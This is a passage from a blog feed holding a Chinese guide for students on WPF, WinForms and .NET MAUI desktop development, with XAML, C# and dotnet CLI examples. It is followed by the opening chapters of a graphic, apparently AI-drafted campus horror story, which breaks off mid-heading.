class="literal">-ForegroundColor</span> Green &#125;</span><br></pre></td></tr></table></figure></p></blockquote><hr><h3 id="二、框架选择决策树（扩展场景）"><a href="#二、框架选择决策树（扩展场景）" class="headerlink" title="二、框架选择决策树（扩展场景）"></a>二、框架选择决策树（扩展场景）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">    A[项目类型] --&gt; B&#123;跨平台需求？&#125;</span><br><span class="line">    B --&gt;|是| C[.NET MAUI]</span><br><span class="line">    B --&gt;|否| D[Windows专属]</span><br><span class="line">    D --&gt; E&#123;硬件交互？&#125;</span><br><span class="line">    E --&gt;|是| F[Win32 API + WPF]</span><br><span class="line">    E --&gt;|否| G&#123;UI复杂度&#125;</span><br><span class="line">    G --&gt;|高| H[WPF]</span><br><span class="line">    G --&gt;|低| I[WinForms]</span><br><span class="line">    A --&gt; J&#123;学校技术栈&#125;</span><br><span class="line">    J --&gt;|C++/MFC| K[维护旧项目]</span><br><span class="line">    J --&gt;|C#| H</span><br></pre></td></tr></table></figure><h4 id="框架对比表（关键指标）"><a href="#框架对比表（关键指标）" class="headerlink" title="框架对比表（关键指标）"></a><strong>框架对比表（关键指标）</strong></h4><div class="table-container"><table><thead><tr><th><strong>框架</strong></th><th><strong>渲染技术</strong></th><th><strong>数据绑定支持</strong></th><th><strong>跨平台能力</strong></th><th><strong>典型内存占用</strong></th></tr></thead><tbody><tr><td>WinForms</td><td>GDI+</td><td>基本绑定</td><td>❌ (Wine兼容)</td><td>80-150 MB</td></tr><tr><td>WPF</td><td>DirectX</td><td>MVVM高级绑定</td><td>❌</td><td>100-200 MB</td></tr><tr><td>WinUI 3</td><td>DirectX 12</td><td>MVVM原生支持</td><td>❌</td><td>120-250 MB</td></tr><tr><td>.NET MAUI</td><td>原生控件+Skia</td><td>MVVM</td><td>✅ (Win/iOS/Android)</td><td>150-300 MB</td></tr></tbody></table></div><blockquote><p><strong>选型案例</strong>：<br><br>• 跨平台课设《校园导航APP》→ <strong>.NET MAUI</strong><br><br>• 实验室串口监控工具 → <strong>WPF + <a href="https://github.com/jcurl/SerialPortStream">SerialPort库</a></strong></p></blockquote><hr><h3 id="三、项目开发实战流程（深度扩展）"><a href="#三、项目开发实战流程（深度扩展）" class="headerlink" title="三、项目开发实战流程（深度扩展）"></a>三、项目开发实战流程（深度扩展）</h3><h4 id="1-创建项目（标准化模板）"><a href="#1-创建项目（标准化模板）" class="headerlink" title="1. 创建项目（标准化模板）"></a>1. 创建项目（标准化模板）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用现代项目结构</span></span><br><span class="line">dotnet new wpf -n StudentManager --framework net8.0</span><br><span class="line"><span class="built_in">cd</span> StudentManager</span><br><span class="line">dotnet add package CommunityToolkit.Mvvm <span class="comment"># 官方MVVM工具包</span></span><br></pre></td></tr></table></figure><h4 id="2-界面设计（HandyControl美化示例）"><a href="#2-界面设计（HandyControl美化示例）" class="headerlink" title="2. 界面设计（HandyControl美化示例）"></a>2. 界面设计（HandyControl美化示例）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入UI库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Window</span> <span class="attr">xmlns:hc</span>=<span class="string">&quot;https://handyorg.github.io/handycontrol&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hc:SimplePanel</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hc:DataGrid</span> <span class="attr">ItemsSource</span>=<span class="string">&quot;&#123;Binding Students&#125;&quot;</span> </span></span><br><span class="line"><span class="tag">                     <span class="attr">AutoGenerateColumns</span>=<span class="string">&quot;False&quot;</span></span></span><br><span class="line"><span class="tag">                     <span class="attr">Style</span>=<span class="string">&quot;&#123;StaticResource DataGridCompact&#125;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DataGrid.Columns</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">hc:DataGridTextColumn</span> <span class="attr">Header</span>=<span class="string">&quot;学号&quot;</span> <span class="attr">Binding</span>=<span class="string">&quot;&#123;Binding Id&#125;&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">hc:DataGridComboBoxColumn</span> <span class="attr">Header</span>=<span class="string">&quot;班级&quot;</span> </span></span><br><span class="line"><span class="tag">                    <span class="attr">ItemsSource</span>=<span class="string">&quot;&#123;StaticResource ClassList&#125;&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">SelectedItemBinding</span>=<span class="string">&quot;&#123;Binding Class&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">DataGrid.Columns</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">hc:DataGrid</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hc:CircleButton</span> <span class="attr">Content</span>=<span class="string">&quot;+&quot;</span> </span></span><br><span class="line"><span class="tag">                          <span class="attr">Command</span>=<span class="string">&quot;&#123;Binding AddCommand&#125;&quot;</span></span></span><br><span class="line"><span class="tag">                          <span class="attr">Style</span>=<span class="string">&quot;&#123;StaticResource ButtonSuccess&#125;&quot;</span></span></span><br><span class="line"><span class="tag">                          <span class="attr">Width</span>=<span class="string">&quot;60&quot;</span> <span class="attr">Height</span>=<span class="string">&quot;60&quot;</span></span></span><br><span class="line"><span class="tag">                          <span class="attr">VerticalAlignment</span>=<span class="string">&quot;Bottom&quot;</span> </span></span><br><span class="line"><span class="tag">                          <span class="attr">HorizontalAlignment</span>=<span class="string">&quot;Right&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">hc:SimplePanel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Window</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3-MVVM模式进阶实现"><a href="#3-MVVM模式进阶实现" class="headerlink" title="3. MVVM模式进阶实现"></a>3. MVVM模式进阶实现</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ViewModel层（使用CommunityToolkit简化代码）</span></span><br><span class="line">[<span class="meta">ObservableObject</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">MainViewModel</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">ObservableProperty</span>]</span><br><span class="line">    <span class="keyword">private</span> ObservableCollection&lt;Student&gt; _students = <span class="keyword">new</span>();</span><br><span class="line"></span><br><span class="line">    [<span class="meta">RelayCommand</span>]</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddStudent</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Students.Add(<span class="keyword">new</span> Student &#123; </span><br><span class="line">            Id = Students.Count + <span class="number">1</span>,</span><br><span class="line">            Name = <span class="string">&quot;新学生&quot;</span>,</span><br><span class="line">            Score = <span class="keyword">new</span> Random().Next(<span class="number">60</span>,<span class="number">100</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据验证（System.ComponentModel.DataAnnotations）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Student</span> : <span class="title">INotifyPropertyChanged</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Required(ErrorMessage = <span class="string">&quot;姓名不能为空&quot;</span>)</span>]</span><br><span class="line">    [<span class="meta">StringLength(10, MinimumLength = 2)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    [<span class="meta">Range(0, 100, ErrorMessage = <span class="string">&quot;成绩需在0-100之间&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Score &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-调试技巧（新增实战场景）"><a href="#4-调试技巧（新增实战场景）" class="headerlink" title="4. 调试技巧（新增实战场景）"></a>4. 调试技巧（新增实战场景）</h4><div class="table-container"><table><thead><tr><th><strong>问题类型</strong></th><th><strong>工具组合拳</strong></th><th><strong>操作流程</strong></th></tr></thead><tbody><tr><td><strong>界面布局错乱</strong></td><td>Live Visual Tree + XAML Hot Reload</td><td>1. 运行时修改边距<br>2. 实时查看渲染效果</td></tr><tr><td><strong>内存泄漏</strong></td><td>dotMemory + DebugDiag</td><td>1. 用dotMemory分析对象保留链<br>2. DebugDiag抓取内存dump</td></tr><tr><td><strong>异步死锁</strong></td><td>Parallel Stacks窗口 + async/await分析器</td><td>1. 查看线程阻塞点<br>2. 检查<code>.ConfigureAwait(false)</code>使用</td></tr><tr><td><strong>绑定失效</strong></td><td>PresentationTraceSources.TraceLevel</td><td>在XAML中添加：<br><code>Binding=&#123;Binding Path, diag:PresentationTraceSources.TraceLevel=High&#125;</code></td></tr></tbody></table></div><h4 id="5-打包发布（多平台方案）"><a href="#5-打包发布（多平台方案）" class="headerlink" title="5. 打包发布（多平台方案）"></a>5. 打包发布（多平台方案）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flowchart TB</span><br><span class="line">    subgraph 发布策略</span><br><span class="line">        A[课程作业] --&gt; B[单文件发布]</span><br><span class="line">        A --&gt; C[ClickOnce部署]</span><br><span class="line">        D[毕业设计] --&gt; E[MSIX安装包]</span><br><span class="line">        D --&gt; F[Inno Setup自定义安装]</span><br><span class="line">    end</span><br><span class="line">    </span><br><span class="line">    B --&gt;|命令行| G[dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true]</span><br><span class="line">    E --&gt;|Visual Studio| H[右键项目 → 打包 → 创建MSIX包]</span><br></pre></td></tr></table></figure><blockquote><p><strong>学生避坑指南</strong>：<br></p><ul><li>解决依赖问题：添加<code>&lt;IncludeNativeLibrariesForSelfExtract&gt;true&lt;/IncludeNativeLibrariesForSelfExtract&gt;</code><br></li><li>缩小体积：启用<code>&lt;PublishTrimmed&gt;true&lt;/PublishTrimmed&gt;</code>（小心反射问题）</li></ul></blockquote><hr><h3 id="四、学习资源大全（新增优质内容）"><a href="#四、学习资源大全（新增优质内容）" class="headerlink" title="四、学习资源大全（新增优质内容）"></a>四、学习资源大全（新增优质内容）</h3><h4 id="1-官方资源进阶"><a href="#1-官方资源进阶" class="headerlink" title="1. 官方资源进阶"></a>1. 官方资源进阶</h4><ul><li><a href="https://learn.microsoft.com/zh-cn/dotnet/desktop/wpf/advanced/optimizing-wpf-application-performance">WPF 性能优化指南</a></li><li><a href="https://github.com/microsoft/WindowsAppSDK-Samples">Windows App SDK 示例库</a></li></ul><h4 id="2-中文社区精选"><a href="#2-中文社区精选" class="headerlink" title="2. 中文社区精选"></a>2. 中文社区精选</h4><div class="table-container"><table><thead><tr><th><strong>类型</strong></th><th><strong>资源</strong></th></tr></thead><tbody><tr><td>开源项目</td><td><a href="https://github.com/Kinnara/ModernWpf.Samples">ModernWpf.Samples</a>（Fluent UI实现）</td></tr><tr><td>疑难解答</td><td><a href="https://www.cnblogs.com/zh7791/category/2099801.html">WPF 常见问题合集</a></td></tr><tr><td>设计资源</td><td><a href="https://github.com/microsoft/fluentui-system-icons">Fluent UI System Icons</a>（5000+免费图标）</td></tr></tbody></table></div><h4 id="3-项目灵感库（带技术栈标注）"><a href="#3-项目灵感库（带技术栈标注）" class="headerlink" title="3. 项目灵感库（带技术栈标注）"></a>3. 项目灵感库（带技术栈标注）</h4><div class="table-container"><table><thead><tr><th><strong>项目名</strong></th><th><strong>技术组合</strong></th><th><strong>源码地址</strong></th></tr></thead><tbody><tr><td>智能教室管理系统</td><td>WPF + ML.NET（人脸识别）</td><td><a href="https://github.com/edu-iot/ClassManager">GitHub链接</a></td></tr><tr><td>实验数据可视化</td><td>LiveCharts2 + OPC UA通信</td><td><a href="https://github.com/lab-visualization">GitHub链接</a></td></tr><tr><td>跨平台课程表</td><td>.NET MAUI + Blazor Hybrid</td><td><a href="https://github.com/edu-timetable">GitHub链接</a></td></tr></tbody></table></div><hr><h3 id="五、高频问题解决方案"><a href="#五、高频问题解决方案" class="headerlink" title="五、高频问题解决方案"></a>五、高频问题解决方案</h3><h4 id="🔧-UI卡顿优化方案"><a href="#🔧-UI卡顿优化方案" class="headerlink" title="🔧 UI卡顿优化方案"></a>🔧 <strong>UI卡顿优化方案</strong></h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正确异步加载示例</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">async</span> Task <span class="title">LoadDataAsync</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 显示加载动画</span></span><br><span class="line">    IsLoading = <span class="literal">true</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 释放UI线程</span></span><br><span class="line">    <span class="keyword">var</span> data = <span class="keyword">await</span> Task.Run(() =&gt; </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> DatabaseService.GetLargeDataSet(); <span class="comment">// 耗时操作</span></span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回UI线程更新</span></span><br><span class="line">    DataCollection = <span class="keyword">new</span> ObservableCollection(data);</span><br><span class="line">    IsLoading = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 避免冻结界面</span></span><br><span class="line">&lt;DataGrid VirtualizingPanel.IsVirtualizing=<span class="string">&quot;True&quot;</span> </span><br><span class="line">          EnableRowVirtualization=<span class="string">&quot;True&quot;</span></span><br><span class="line">          VirtualizingPanel.VirtualizationMode=<span class="string">&quot;Recycling&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><h4 id="🎨-界面美化方案"><a href="#🎨-界面美化方案" class="headerlink" title="🎨 界面美化方案"></a>🎨 <strong>界面美化方案</strong></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 使用ModernWPF实现深色模式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Window.Resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ResourceDictionary</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ResourceDictionary.MergedDictionaries</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xaml:ControlsResources</span> <span class="attr">xmlns:xaml</span>=<span class="string">&quot;using:ModernWpf&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xaml:ThemeResources</span> <span class="attr">xmlns:xaml</span>=<span class="string">&quot;using:ModernWpf&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ResourceDictionary.MergedDictionaries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ResourceDictionary</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Window.Resources</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 动态切换主题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span> <span class="attr">Content</span>=<span class="string">&quot;深色模式&quot;</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">Command</span>=<span class="string">&quot;&#123;Binding ToggleThemeCommand&#125;&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">Style</span>=<span class="string">&quot;&#123;StaticResource AccentButtonStyle&#125;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><h4 id="📦-依赖管理技巧"><a href="#📦-依赖管理技巧" class="headerlink" title="📦 依赖管理技巧"></a>📦 <strong>依赖管理技巧</strong></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 统一版本管理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory.Build.props</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Project</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">HandyControlVersion</span>&gt;</span>3.4.0<span class="tag">&lt;/<span class="name">HandyControlVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">PropertyGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Project</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory.Build.props</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ItemGroup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">PackageReference</span> <span class="attr">Include</span>=<span class="string">&quot;HandyControl&quot;</span> <span class="attr">Version</span>=<span class="string">&quot;$(HandyControlVersion)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ItemGroup</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="六、总结：学生开发黄金法则"><a href="#六、总结：学生开发黄金法则" class="headerlink" title="六、总结：学生开发黄金法则"></a>六、总结：学生开发黄金法则</h3><h4 id="⏱️-时间管理矩阵"><a href="#⏱️-时间管理矩阵" class="headerlink" title="⏱️ 时间管理矩阵"></a>⏱️ <strong>时间管理矩阵</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">quadrantChart</span><br><span class="line">    title 任务优先级划分</span><br><span class="line">    x-axis 紧急性 → 低</span><br><span class="line">    y-axis 重要性 → 高</span><br><span class="line">    quadrant-1: 核心功能模块（如数据存储）</span><br><span class="line">    quadrant-2: 界面美化/动画</span><br><span class="line">    quadrant-3: 第三方服务集成</span><br><span class="line">    quadrant-4: 文档编写</span><br></pre></td></tr></table></figure><h4 id="🚀-技术成长路径"><a href="#🚀-技术成长路径" class="headerlink" title="🚀 技术成长路径"></a>🚀 <strong>技术成长路径</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">学期1：WinForms基础 → 计算器/记事本</span><br><span class="line">学期2：WPF基础 → 学生信息管理系统  </span><br><span class="line">学期3：WPF进阶 → 实时数据监控大屏  </span><br><span class="line">毕业设计：WinUI 3/.NET MAUI → 跨平台智慧校园系统</span><br></pre></td></tr></table></figure><h4 id="💼-作品增值策略"><a href="#💼-作品增值策略" class="headerlink" title="💼 作品增值策略"></a>💼 <strong>作品增值策略</strong></h4><ol><li><strong>代码质量</strong>：  <ul><li>集成<a href="https://www.sonarsource.com/products/sonarqube/">SonarQube</a>静态分析  </li><li>保持90%+单元测试覆盖率</li></ul></li><li><strong>部署创新</strong>：  <ul><li>使用<a href="https://hub.docker.com/_/microsoft-dotnet">Docker部署后台服务</a></li><li>制作<a href="https://learn.microsoft.com/zh-cn/windows/uwp/publish/">Windows Store包</a>提升可信度</li></ul></li><li><strong>成果展示</strong>：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">journey</span><br><span class="line">    title 项目展示路线图</span><br><span class="line">    section 准备阶段</span><br><span class="line">      录制演示视频： 5： 完整功能演示</span><br><span class="line">      撰写技术博客： 3： 架构设计解析</span><br><span class="line">    section 交付阶段</span><br><span class="line">      GitHub仓库： 5： 含README.md和Wiki</span><br><span class="line">      在线体验版： 4： Azure Static Web Apps</span><br></pre></td></tr></table></figure></li></ol><blockquote><p><strong>终极建议</strong>：参与开源项目维护（如<a href="https://github.com/HandyOrg/HandyControl">HandyControl</a>)，在真实代码协作中提升工程能力！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 应用程序开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily Life </tag>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>噩梦</title>
      <link href="/posts/15d54cd8.html"/>
      <url>/posts/15d54cd8.html</url>
      
        <content type="html"><![CDATA[<p>做了个很长的噩梦，非常的恐怖，我把梦里的东西都记下来，丢给AI写了篇校园恐怖小说（笔者文笔不好，AI写作能力也一般）</p><h1 id="紫烟照骨：旧校秽录"><a href="#紫烟照骨：旧校秽录" class="headerlink" title="紫烟照骨：旧校秽录"></a>紫烟照骨：旧校秽录</h1><h2 id="第一章：考场里的亡灵低语"><a href="#第一章：考场里的亡灵低语" class="headerlink" title="第一章：考场里的亡灵低语"></a>第一章：考场里的亡灵低语</h2><p>高考最后一科，空气凝滞得如同灌铅。林羽的笔尖悬在卷面上，指尖却传来一阵突如其来的灼痛，仿佛被无形的针扎透。他下意识低头，瞳孔骤缩——一滴粘稠、暗红如腐败果酱的液体，正从笔尖渗出，在洁白的答题卡上蜿蜒出一道刺目的“血痕”。那腥甜铁锈味瞬间钻入鼻腔，浓烈得不似幻觉。</p><p>他猛地抬头，心脏像被冰冷的手攥紧。前排那个一直埋头奋笔疾书的考生，后颈的衣领不知何时已被濡湿一片，暗红色的粘液正缓慢地、一滴滴砸落在他的椅背上，发出极其轻微的“啪嗒”声。那绝不是汗！林羽的胃部一阵翻搅。他强迫自己移开视线，却正对上监考老师转过来的脸。</p><p>时间仿佛凝固了。那张脸……那根本不是人脸！皮肤呈现出焦炭般的皲裂，边缘翻卷，露出底下暗红发黑的肌肉纹理。空洞的眼眶里，不是黑暗，而是无数细小的、乳白色的蛆虫在疯狂地蠕动、钻探，有些甚至簌簌地掉落在讲台上。那张嘴咧开一个诡异的弧度，露出焦黑的牙龈，发出的声音像是生锈的铁片在粗糙的水泥地上反复刮擦：“同学…你看到…卷子了吗？”</p><p>林羽的指甲瞬间深深掐进掌心，剧痛让他勉强维持一丝清醒。他死死盯着自己的试卷，试图屏蔽那非人的景象和声音。然而，纸面上的方块字开始诡异地蠕动、扭曲、拉伸……像活过来的黑色线虫，几秒钟内竟重组成了密密麻麻的、陌生的日文！就在此时，窗外，一阵沉重、整齐、带着金属撞击回音的军靴踏步声由远及近，如同踏在心脏上。他惊恐地侧目望去——一队穿着昭和时期土黄色旧式军装的士兵，如同褪色的旧胶片影像，正从走廊无声地“飘”过。他们肩上的刺刀寒光闪闪，刀尖上赫然穿刺着几团模糊、滴着粘液的暗红色内脏！领口那枚代表“山形”部队的“山”字军旗徽章，仿佛浸透了鲜血，正缓缓向下滴落着暗红的液体，在光洁的地板上留下断续、诡异的污迹。</p><h2 id="第二章：疯癫者的遗物"><a href="#第二章：疯癫者的遗物" class="headerlink" title="第二章：疯癫者的遗物"></a>第二章：疯癫者的遗物</h2><p>一年后的秋日，我拖着行李箱，推开602宿舍厚重的木门。一股混合着浓重尸腐味和生铁锈蚀的恶臭，如同实质的拳头，狠狠砸在脸上，几乎令人窒息。宿舍里光线昏暗，尘埃在仅有的光柱中狂舞。我的目光不由自主地锁定在上铺——一块陈旧的床板中央，赫然裂开一道不规则的缝隙，像一张咧开的嘴。缝隙下，不是木纹，而是用某种暗红色、仿佛干涸血迹的颜料，绘制着一个繁复扭曲的圆形阵法。阵法中央，端端正正摆放着一截苍白、僵硬的断指！指甲缝里还残留着暗红的污垢。</p><p>室友阿杰不知何时站在我身后，脸色在阴影中显得青白。他凑近我耳边，声音压得极低，带着神经质的颤抖：“上一个住这儿的…姓刘。就睡那张床。有天半夜，他突然坐起来，眼睛瞪得像铜铃，直勾勾盯着天花板笑，说‘里面有东西在爬…痒……’然后…他就用美工刀…一点一点…把自己肚子划开了……像拆包裹一样……”</p><p>深夜的死寂被突兀打破。天花板上方，传来清晰的“哒、哒、哒……”声，仿佛有冰冷的玻璃珠被一只无形的手不断弹落、滚动。这单调的声音中，渐渐混入一种压抑的、断断续续的女人呜咽，时高时低，仿佛就在耳边吹气。寒意顺着脊椎爬升。我猛地摸出手机，颤抖着打开手电筒。惨白的光束如同探照灯扫过房间角落的旧衣柜。当光束扫过衣柜那面模糊的穿衣镜时，镜面猛地一闪！映出的不是我的脸——而是一张高度腐烂、皮肉翻卷的面孔！稀疏花白的头发下，大片头皮脱落，露出灰白色的头骨和下面密密麻麻、疯狂扭动的白色蛆虫！那五官…那分明是白天还板着脸给我们钥匙的宿管阿姨！镜中的“她”似乎察觉到了我的注视，裂开一个无声的笑容，更多的蛆虫从嘴角的烂肉里涌了出来。</p><h2 id="第三章：不存在的231室"><a href="#第三章：不存在的231室" class="headerlink" 